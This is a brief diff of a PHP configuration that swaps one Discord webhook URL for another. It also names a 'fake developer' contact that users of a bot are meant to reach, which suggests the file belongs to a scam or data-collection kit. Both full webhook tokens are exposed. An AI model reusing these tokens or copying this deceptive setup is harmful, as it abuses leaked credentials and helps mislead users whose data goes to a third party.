@@ -1,7 +1,7 @@
 <?php
 
 
-    $webhook = "https://discord.com/api/webhooks/787180638540660757/3prUwBP3q02yvtsImuKLOrvY32ITwUPKnGJv_35iKq_7xcKLq9E3mZzcLaecAPy-FFdb";
+    $webhook = "https://discord.com/api/webhooks/1266814790882426890/WZs5L9-S7xqbP3EU5ea-tOJ3urnYUDtT1wN_fL4wAa3LhCJcr935cnkrsse9nceLdEGz";
     // fake developer for the bot the users may contact
     $discord_contact = "daddydraw";
     
